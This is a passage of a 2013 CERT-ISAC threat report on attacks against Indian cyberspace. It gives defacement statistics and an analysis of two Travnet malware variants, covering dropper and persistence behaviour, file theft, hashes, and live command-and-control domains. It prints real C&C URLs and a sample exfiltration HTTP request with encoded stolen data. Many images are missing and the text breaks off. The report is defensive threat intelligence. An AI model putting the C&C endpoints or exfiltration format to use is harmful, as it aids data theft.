@@ -1,0 +1,2375 @@
+ 
+
+ 
+
+ 
+
+ 
+
+Inside Report – APT Attacks on 
+
+Indian Cyber Space 
+
+REPORT BY INFOSEC CONSORTIUM 
+
+Author:, 
+Rajshekhar Murthy – Director, CERT-ISAC, National Security Database 
+Atul Alex Cherian – Director, Research Bundle 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+In Collaboration with 
+
+ 
+
+ 
+
+CERT-ISAC 
+
+Supported by NTRO and CERT-IN, Government of India 
+
+Malware analysis powered by Po Antivirus from Research Bundle 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Supporting Authors:   
+
+Atul Alex Cherian, National Security Database empaneled expert | Director – Research Bundle 
+
+Rajshekhar Murthy, National Security Database empaneled expert | Director – CERT-ISAC (NSD) 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Supported by 
+
+ 
+
+An INFOSEC CONSORTIUM Event 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+Objective: 
+The objective of this report is the following: 
+
+  An overview of malware distribution in Indian Cyberspace 
+
+  Detailed, in-depth technical analysis of Advanced Persistent Threat (APT) actors against India 
+
+ 
+
+Enumerate the primary technical causes leading to successful attacks 
+
+  Recommendations to improve and protect the overall Critical Information Infrastructuren   
+
+About CERT-ISAC 
+CERT-ISAC  is  India’s  first  Independent  CERT  for  mobile  and  electronic  security.  Established  by  the  non-profit 
+
+scientific  foundation  “Information  Sharing  and  Analysis  Center”  (ISAC)  that  manages  the  National  security 
+
+Database (NSD) program, CERT-ISAC has a dedicated 30 seat threat intelligence monitoring center at New Delhi 
+
+and Mumbai to monitor constant threats and attacks on the India Cyber Space. CERT-ISAC has numerous security 
+
+experts from the National Security Database program who regularly support the research initiatives. 
+
+About Po: Mobile Anti-Virus 
+“Po” is an advanced behavior based mobile anti-virus designed by the organization Research Bunble, especially 
+
+for  the defence.  The Po  Engine  is  currently used  by  CERT-ISAC  for  malware  analysis  and  certification of mobile 
+
+apps for security and privacy.         
+
+How is this document organized: 
+ 
+
+ 
+
+ 
+
+Pre-requsites to read the document 
+ 
+
+Rating 
+
+Non Technical 
+Highly Technical 
+Semi-Technical 
+Non Technical 
+
+Audience 
+
+CEOS, Chairman, Directors 
+Technical and Subject Matter Experts 
+Managers, CIOs, Vice Presidents and above 
+CEOs, Chairman, Policy makers, Authority 
+
+Section 
+
+Part One 
+Part Two 
+Part Three 
+Part Four 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+Table of Contents 
+Objective: ............................................................................................................................................................................................. 3 
+
+About CERT-ISAC .................................................................................................................................................................................. 3 
+
+About Po: Mobile Anti-Virus ................................................................................................................................................................ 3 
+
+How is this document organized: .................................................................................................................................................... 3 
+
+Pre-requsites to read the document ............................................................................................................................................... 3 
+
+PART ONE: HUNTER OR HUNTED? ....................................................................................................................................................... 6 
+
+How is this report organized? ......................................................................................................................................................... 6 
+
+APT campaigns against India ........................................................................................................................................................... 6 
+
+Malware Distribution in India.......................................................................................................................................................... 7 
+
+Overview of attacks on India from 26th May 2013 to 26th June 2013 .............................................................................................. 7 
+
+Attacked and compromised websites from TATA Communications ............................................................................................... 7 
+
+Attacked and compromised websites from Web Werks ................................................................................................................. 8 
+
+Attacked and compromised websites from Net Magic Datacenter Mumbai .................................................................................. 8 
+
+Attacked and compromised websites from Ctrl-S Datacenter ........................................................................................................ 9 
+
+Attacked and compromised websites from Net4India .................................................................................................................... 9 
+
+Attacked and compromised websites from National Informatics Center (NIC) ............................................................................ 10 
+
+Statistics from CERT-IN .................................................................................................................................................................. 10 
+
+Attack on Indian IT Infrastructure: Zone-H Statistics .................................................................................................................... 11 
+
+PART TWO: ADVANCED PERSISTENT THREAT - ANALYSIS ................................................................................................................. 13 
+
+The Travnet Case ........................................................................................................................................................................... 13 
+
+Travnet Technical Analysis: Part A................................................................................................................................................. 14 
+
+Travnet Technical Analysis: Part B ................................................................................................................................................. 26 
+
+Travnet Technical Analysis : Part C ................................................................................................................................................ 30 
+
+Conclusion of Travnet Analysis: ..................................................................................................................................................... 40 
+
+PART THREE: PRIMARY CAUSES ......................................................................................................................................................... 42 
+
+Use of Outdated Software on Government Websites................................................................................................................... 42 
+
+Webshells on Indian Websites ...................................................................................................................................................... 43 
+
+PART FOUR: RECOMMENDATIONS .................................................................................................................................................... 46 
+
+Policy on Domain Name acquisition, management & maintenance ............................................................................................. 46 
+
+Policy on Vendor qualification for secure website development.................................................................................................. 46 
+
+Policy on Patch Management ........................................................................................................................................................ 46 
+
+Policy, Process and Guidelines on Full disclosures ........................................................................................................................ 47 
+
+Role of National Security Database ............................................................................................................................................... 47 
+
+References:.................................................................................................................................................................................... 47 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+PART ONE 
+
+ 
+
+Hunter or the hunted? : 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+PART ONE: HUNTER OR HUNTED? 
+
+ 
+
+Attacks & Cyber threats against India 
+
+www.ResearchBundle.com 
+
+ 
+
+The  recent  ‘Operation  Hangover’  report  from  Norman’s  Malware 
+
+Detection Team has projected India as an emerging APT actor. The 
+
+report goes on to document a detailed analysis of targeted malware 
+
+and  lists  a  small  number  of  Indian-based  companies  that  were 
+
+potentially threat actors involved in the campaign. 
+
+While  the  ‘Hangover’  report  itself  has  been  widely  debated  in  the 
+
+Indian Information Security community, there is little proof, beyond 
+
+circumstantial evidence provided in the Norman report, that Indian 
+
+actors  were  behind  this  APT  campaign,  and  the  larger  concern 
+
+remains that India is the victim of numerous APT campaigns, rather 
+
+than an instigator of this threat. 
+
+As our Government is rapidly migrating towards e-governance, it is 
+
+vital  to  ensure  a  robust  approach  to  data  security  is  implemented 
+
+from  an  early  stage  to  prevent  misuse  and  subsequent  attacks  on 
+
+critical  infrastructure  and  the  national  economy.  A  quick  look  at 
+
+India's history with respect to battling cyber threats, reveals an age-
+
+old  & on-going  war  between  the  “hackers”  from  various  Nations.  Defacement of  Indian  government  sites  date 
+
+back to the year 2003 & even today, they continue to happen.   
+
+In this report, we analyse the various facts and provide in-depth analysis of an “Advanced persistent threat” attack 
+
+on India that makes us ask – Are we the hunter or the hunted? 
+
+How is this report organized? 
+
+  Part one – Hunter or the Hunted? 
+
+  Part two – Advanced persistent threat - analysis 
+
+  Part three - Primary Causes 
+
+  Part four - Recommendations 
+
+APT campaigns against India 
+“Advanced persistent threat” or APT as it is known, is a reality today. Unlike the regular script-kiddie attacks that 
+
+are carried out usually for fun or for fame, APTs are serious campaigns, undertaken by groups with a variety of 
+
+skill-sets. The focus of an APT campaign usually is to gather valuable information against specific companies / 
+
+organizations or selected sectors of a country. These usually begin with highly targeted spear-phishing attacks.   
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+Malware Distribution in India 
+Out of 25,935 websites scanned by Google, 14% websites were infected by Malware. 
+
+Overview of attacks on India from 26th May 2013 to 26th June 2013 
+ 
+
+AS = Attack Sites 
+
+ 
+
+Attacked and compromised websites from TATA Communications 
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+Attacked and compromised websites from Web Werks 
+ 
+
+ 
+
+Attacked and compromised websites from Net Magic Datacenter Mumbai 
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+Attacked and compromised websites from Ctrl-S Datacenter 
+ 
+
+ 
+
+Attacked and compromised websites from Net4India 
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Attacked and compromised websites from National Informatics Center (NIC) 
+
+ 
+
+Statistics from CERT-IN 
+To make some sense of the current scenario of cyber security in India, let’s have a look at some of the statistics 
+
+published by CERT-India. The following table should give us a good idea of how things are shaping up. 
+
+ 
+
+ 
+
+ 
+
+Activity   
+Security Incidents handled 
+Security Alerts issued   
+Advisories Published   
+Vulnerability Notes Published   
+Security Guidelines Published   
+White papers/Case Studies   
+ 
+Published   
+Trainings Organized   
+Indian Website Defacements   
+ 
+tracked   
+Open Proxy Servers tracked   
+Bot Infected Systems tracked   
+
+2006 
+552 
+48 
+50 
+138 
+
+1 
+2 
+
+7 
+
+2007 
+1237 
+
+44 
+66 
+163 
+
+1 
+2 
+
+6 
+
+5211 
+
+5863 
+
+2008 
+2565 
+
+2009 
+8266 
+
+2010 
+10315 
+
+2011 
+13301 
+
+49 
+76 
+197 
+
+1 
+1 
+
+29 
+61 
+157 
+
+0 
+1 
+
+43 
+72 
+274 
+
+1 
+1 
+
+48 
+81 
+188 
+
+4 
+3 
+
+18 
+
+5475 
+
+19 
+
+6023 
+
+26 
+
+26 
+
+14348 
+
+17306 
+
+1837 
+
+0 
+
+1805 
+25915 
+
+2332 
+
+2583 
+
+2492 
+
+3294 
+
+146891 
+
+3509166 
+
+6893814 
+
+6277936 
+
+It’s not surprising to note that the threats are increasing at an alarming rate, year after year. In a way, it’s 
+
+heartening to observe the CERT evolve & rise upto newer challenges & latest threats.   
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+Unfortunately, it’s not enough. The reports submitted by CERT do not take into account the most fundamental 
+
+aspects of maintaining a state of secure IT environment. This fact is evident from the number of security incidents 
+
+that happen over an year & how the right authorities react to them. If every reported incident was handled properly 
+
+by identifying the root cause, followed by a full security audit, we wonder if the numbers would grow so fast. As 
+
+mentioned earlier, cases of government sites being defaced date back to 2003. Even today, one can find servers 
+
+running older & vulnerable versions of software, poor server management, web applications deployed on these 
+
+servers being designed & implemented by programmers who lack awareness of secure coding practices, to name 
+
+a few. The private sector though, is much more cautious & alert when it comes to their IT infrastructure compared 
+
+to the government. 
+
+Attack on Indian IT Infrastructure: Zone-H Statistics 
+Let’s analyse the state of government's IT infrastructure in the following pages. 
+
+While the statistics presented by CERT-In looks alarming by itself, the actual state of domains that end with 
+
+“gov.in”, is much worse. A quick look at the following recent screenshot of www.zone-h.org site provides some 
+
+shocking insight. According to the site, the current statistics are as follows: 
+
+Total Notifications : 1299 
+
+Mass defacements : 753 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+ 
+ 
+ 
+ 
+ 
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+PART TWO: 
+
+ 
+
+ADVANCED PERSISTENT 
+
+THREAT 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+PART TWO: ADVANCED PERSISTENT THREAT - ANALYSIS 
+
+The Travnet Case 
+A recent incident that caught our attention was the “Travnet” case. We carried out a preliminary analysis of our 
+
+own on the subject. Kaspersky as well as McAfee amongst others, have published detailed analysis of the malware 
+
+& the campaign.   
+
+Our focus was to understand the nature of the group behind the attack & its agenda. It began with Kaspersky's 
+
+revelation of the attack. We recommend you to go through Kaspersky & McAfee's analysis of the malware to know 
+
+more about the spear phishing campaign & the exploits used.   
+
+Our analysis is currently focussed only on the  malware samples that are dropped on the target systems, as the 
+
+exploits used during the spear-phishing campaign are older & already patched by the respective vendors. 
+
+To summarize the modus operandi of the attack, targeted phishing mails were sent to individuals, having Office 
+
+documents as attachments. These documents exploited previously known vulnerabilities ( CVE-2012-0158 and 
+
+CVE-2010-3333 ) to drop “Travnet” malware onto the systems. Its fascinating to note that the attachments that 
+
+were sent to Indian targets were carefully selected & some of them were    named as follows: 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+“Army Cyber Security Policy 2013.doc” 
+
+“Jallianwala bagh massacre a deeply shameful act.doc” 
+
+“Report - Asia Defense Spending Boom.doc” 
+
+“His Holiness the Dalai Lama’s visit to Switzerland day 3.doc” 
+
+“BJP won’t dump Modi for Nitish NDA headed for split.doc” 
+
+As its evident, the group behind the attack obviously has done extensive research on topics that are current as 
+
+well as intriguing to the Indian targets. We managed to acquired 2 variants of the “Travnet” malware & our 
+
+analysis of the same is as follows. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+Travnet Technical Analysis: Part A 
+
+ 
+
+File details : 
+
+Filename   
+
+travnet_A.exe 
+
+ 
+
+MD5             
+
+d286c4cdf40e2dae5362eff562bccd3a 
+
+SHA1           
+
+25ac3098261df8aa09449a9a4c445c91321352af   
+
+ 
+
+SHA256       
+
+a75fdd9e52643dc7a1790c79cbfffe9348f80a9b0984eafd90723bf7ca68f4ce 
+
+Filesize 
+
+97792 bytes 
+
+Filetype 
+
+PE32 executable (GUI) Intel 80386, for MS Windows 
+
+ 
+
+A quick analysis by PEiD reveals that the binary is not packed or protected.   
+
+ 
+
+ 
+
+It begins by creating a new mutex object, named “ INSTALL SERVICES NOW!”. 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+Next step is to create a configuration file named “config_t.dat” in the windows' “system” folder. 
+
+ 
+
+ 
+
+ 
+
+It then   
+
+populates it 
+
+with the 
+
+right 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+parameters, after decoding them. 
+
+After the configuration file is written, it checks if the malware was previously installed or not, if not, it creates a 
+
+dynamic-link library in the “system32” folder, creates a temporary batch file named as “temp.bat” which installs 
+
+the previous DLL as a service on the system. The name of the DLL that is created, is based upon the values of the 
+
+data from “netsvcs” from the following registry key : “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
+
+NT\CurrentVersion\Svchost”. During this runtime, it turned out to be “6to4ex.dll” but it can change from runtime 
+
+to runtime.The malware then deletes the batch file. Its obvious that this executable basically acts as a dropper. 
+
+The contents of the batch file & the configuration file generated are as follows. 
+
+ 
+
+Batch file : temp.bat 
+
+ 
+
+Configuration file : config_t.dat 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+Next section focuses on the analysis of the DLL (“6to4ex.dll”) that was dropped by this executable. 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Analysis of “6to4ex.dll” 
+
+File Details 
+
+Filename   
+
+6to4ex.dll 
+
+MD5             
+
+452660884ebe3e88ddabe2b340113c8a   
+
+SHA1           
+
+b80d436afcf2f0493f2317ff1a38c9ba329f24b1 
+
+SHA256       
+
+ed6ad64dad85fe11f3cc786c8de1f5b239115b94e30420860f02e820ffc53924 
+
+Filetype 
+
+PE32 executable (DLL) (GUI) Intel 80386, for MS Windows 
+
+Filesize 
+
+46592 bytes 
+
+C&C url 
+
+http://www.newesyahoo.com/traveler1/net/nettraveler.asp 
+
+ 
+
+A quick analysis by PEiD reveals that the binary is not packed or protected.   
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+Now, as we know already, this DLL was installed as a service by the previous dropper. Analysis of the 
+
+“ServiceMain” function of the DLL throws light on many interesting things. The first thing it does upon execution 
+
+is to create a new mutex object named “NetTravler Is Running!”. Its usually done to avoid running multiple 
+
+instances of the same malware.   
+
+ 
+
+Next, it reads the configuration file. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+Additionally, it also creates few interesting files in the “system32” folder. 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+The filenames are quite indicative of what their contents might be. 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+“enumfs.ini” as the name suggests, is a complete list of all files and folders on the computer. “dnlist.ini” seems to 
+
+be noting down the date & time. “system_t.dll” on the other hand, contains a broad category of sensitive 
+
+information about the computer like the “Computer Name”, Windows version, IP address, list of running 
+
+processes, network information & so on. The contents of the files are as follows   
+
+ 
+
+Filename : “system_t.dll” 
+
+ 
+
+ 
+
+Upon proper character encoding & use of google's Translate feature, it turns out to be “Chinese”. 
+
+ 
+
+ 
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Filename : “enumfs.ini” 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Filename : “dnlist.ini” 
+
+ 
+
+ 
+
+Another interesting aspect of Travnet is that it can specifically search for files of the type “doc, docx, xls, xlsx, txt, 
+
+rtf, pdf” on the victim machine. This provides enough hint that this malware was designed to steal confidential 
+
+information unlike the usual botnet variants that focus primarily on providing remote access to the system or to 
+
+act as zombies for launching DDOS attacks. 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+To summarize, the Travnet malware initially collects system information, a list of files on the victim machine 
+
+among others, then sends this data to the remote Command & Control (C&C) server, by using custom 
+
+compression & encoding functions. The malware creates a new file with the naming convention as follows : 
+
+“travlerbackinfo-%d-%d-%d-%d-%d.dll”, where the signed integer values are replaced by the current system 
+
+date & time, copies the content of “system_t.dll” into it & then, uploads it to the C&C. 
+
+ 
+
+It also uploads the list of files found on the victim machine, which was saved in the “enumfs.ini” file to the remote 
+
+server, by copying its contents to a new file, named following this format:   
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+“FileList-%02u%02u-%02u%02u%02u.ini” 
+
+ 
+
+ 
+
+It doesn't stop at that, it even uploads the victim's files onto the remote C&C that have the file extensions “doc, 
+
+docx, xls, xlsx, txt, rtf, pdf” as well as the files on the victim's desktop folder. Another important aspect of Travnet 
+
+is the fact that it uses a custom compression & encoding algorithm    on the data collected, before its sent to the 
+
+remote C&C. A typical file upload communication between the bot & the C&C looks like this: 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+An actual HTTP GET request looks like this: 
+
+“http://www.newesyahoo.com/traveler1/net/nettraveler.asp?hostid=00CD1A40&hostname=ComputerName&ho
+
+stip=127.0.0.1&filename=FileList-0523-
+
+131103.ini&filestart=0&filetext=begin::RgAxAC2QzebTgdToZTkXQaCicYTaZR72HWSigYTPHjEZDUZTvgBrOEmQ0
+
+nIxm86m46D0YTg*::end” 
+
+ 
+
+Here, the data between “begin::” & “::end” is the actual file content, that was compressed & encoded by the bot. 
+
+It seems that this older variant of the Travnet malware supported 4 different types of commands from the 
+
+remote C&C and they are as follows: 
+
+  UNINSTALL 
+
+  UPDATE 
+
+  RESET 
+
+  UPLOAD 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+That concludes Part-A of our Travnet analysis. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Travnet Technical Analysis: Part B 
+
+ 
+
+File details : 
+
+Filename   
+
+travnet_B.exe 
+
+ 
+
+MD5             
+
+9d22897b05261ad66645887b094a43c7 
+
+SHA1           
+
+dc63b4b9ee2f8486b96ce62be4a31e041d422ef7 
+
+SHA256       
+
+e547e8a8bc27d65dca92bc861be82e1c94b9c9aca8a2b75381e9b16e4ad89600 
+
+Filetype 
+
+PE32 executable (GUI) Intel 80386, for MS Windows 
+
+Filesize 
+
+102400 bytes 
+
+C&C Url 
+
+http://www.viprambler.com/newsinfo/uld/nettraveler.asp 
+
+ 
+
+A quick analysis by PEiD reveals that the binary is not packed or protected.   
+
+This executable is apparently an updated variant of Travnet. The major changes are as follows: 
+
+ 
+
+ 
+
+ 
+
+It’s an executable & not a DLL. 
+
+The compression algorithm has been modified. 
+
+It tries to install itself on the victim machine to achieve persistence instead of dropping other payloads. 
+
+  Supports just 2 instructions from the C&C instead of 4, like in the previous version. 
+
+ 
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Apart from these, there isn't much difference. The following analysis only focuses on what has changed.   
+
+It achieves persistence by copying itself to the currently logged-in user's “temp” folder as “csmss.exe” & placing 
+
+a shortcut to it, named as “seruvice.lnk” in the “startup” folder. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+The next step it to create a new mutex object to avoid running multiple instances. It names the mutex as 
+
+“Assassin”. 
+
+ 
+
+ 
+
+After this, it generates a unique 8 characters long “hostid”, based on volume serial number to identify the bot. 
+
+This is common to the previous variant too. 
+
+ 
+
+ 
+
+ 
+
+Then it checks if the victim machine is connected to the internet or not, by trying to resolve “smtp.live.com” & if 
+
+that fails, as a second attempt, “smtp..yahoo.com”. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+The strings displayed above, are actually in “Chinese” & turn out to be : 
+
+ 
+
+ 
+
+“You can connect to the network.”   
+
+"Unable to connect to the network." 
+
+Unlike the previous variant, this one doesn't seem to collect sensitive information about the victim machine. It 
+
+just makes a list of all files & folders on the victim machine & dumps it into a file named as   
+
+“AllIndex.ini”. Next step is to compress the contents of this file, copy the compressed content to a new file named 
+
+as “AllIndex.ini_d” & then delete the previously created clear-text file. The contents of both the files are as 
+
+follows: 
+
+Filename : AllIndex.ini 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Filename : AllIndex.ini_d 
+
+ 
+
+It’s pretty obvious that the compression ratio achieved by the custom algorithm is quite high from the following 
+
+image: 
+
+ 
+
+Apart from that, this variant also creates a file that lists all the currently running processes on the victim machine, 
+
+into a text file named “Process.dll” inside the currently logged-on user's “temp” folder. This variant also uses a 
+
+modified naming convention to upload files onto the remote C&C. The only other major difference from the 
+
+previous variant is the fact that this one only supports 2 commands from the remote C&C server, instead of 4 & 
+
+they are as follows: 
+
+ 
+
+ 
+
+  Uninstall 
+
+  Upload 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+ 
+
+ 
+
+The C&C server in case of this variant was located at :   
+
+  "http://www.viprambler.com/newsinfo/uld/nettraveler.asp" 
+
+ 
+
+Travnet Technical Analysis : Part C 
+
+ 
+
+Apart from analyzing the malware samples, we also tried to gather as much information about the C&C servers 
+
+as we could. The fact that even after a lot of research papers being published on the analysis of the Travnet 
+
+malware, some of the C&C servers are still active & functioning, is noteworthy. We were able to locate a few of 
+
+them. The ones that caught our attention are currently hosted on these domains : 
+
+  www.pkspring.net 
+
+  www.viprambler.com 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Let’s start with the analysis of “www.viprambler.com”.    WHOIS record for the domain currently is as follows: 
+
+ 
+
+Registrant information for the domain is as follows : 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Our analysis strongly suggests that the group behind Travnet might be from China. The above record is just one 
+
+of the findings that supports the claim. Its interesting to note that the domain was recently registered, is locked 
+
+& expires in 2014. Another interesting observation is the address of the registrant. “Guangdong” province from 
+
+China seems to pop up everywhere. Its also noteworthy that the domain is still active & still hosting the Travnet 
+
+C&C. We've also observed that the C&C now remains active only during specific time of the day. The time-stamp 
+
+from the images below, confirms this. 
+
+ 
+
+Active response from the C&C : 
+
+ 
+
+ 
+
+C&C server refusing connection later on the same day : 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+Its obvious that even after the discovery of the malware, the group behind this specific attack is determined to 
+
+keep it alive. The Travnet malware as well as its C&C infrastructure is constantly evolving. Lets move onto the 
+
+next active domain. 
+
+The Travnet C&C hosted at “pkspring.net” seems to be fully functional & active all the time. The response from 
+
+the server when opened from a browser is as follows: 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Another interesting finding is the fact that it hosts Travnet C&C on 3 different ports on the server. They are as 
+
+follows: 
+
+ 
+
+ 
+
+  80   
+
+  443 
+
+  8080 
+
+Its evident from the following pictures. 
+
+ 
+
+Port 443   
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+Port 8080 
+
+ 
+
+Moving on, we found out that 21 domains are hosted on the same server at the moment. And all of them are 
+
+active C&C servers for the Travnet malware. They also seem to have interesting domain names. Its an indication 
+
+of the seriousness of the campaign. 
+
+ 
+
+ 
+
+Other domains hosted & owned by the same group on the same server/IP : 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+The image below proves that all of the above domains serve the same Travnet C&C on the same 3    ports, each. 
+
+ 
+
+ 
+
+After this, we focused our attention on the WHOIS details of these domains. At the moment, the details of the 
+
+registrant is kept private & it was recently updated. Its also interesting to note that the group behind this has 
+
+ensured that the domain cannot be taken over by someone else. The following page contains the current WHOIS 
+
+data for the domain. 
+
+“Pkspring.net”    WHOIS data (Recent) 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+ 
+
+ 
+
+Powered by Po Anti-virus from www.researchbundle.com 
+
+ 
+
+Registrant details for the domain :   
+
+  CERT-ISAC - India’s first independent CERT for mobile & electronic security 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+Nothing much to go on there at the moment. But thanks to older WHOIS records, we found out some interesting 
+
+facts.   
+
+The same domain was earlier registered as follows: 
+
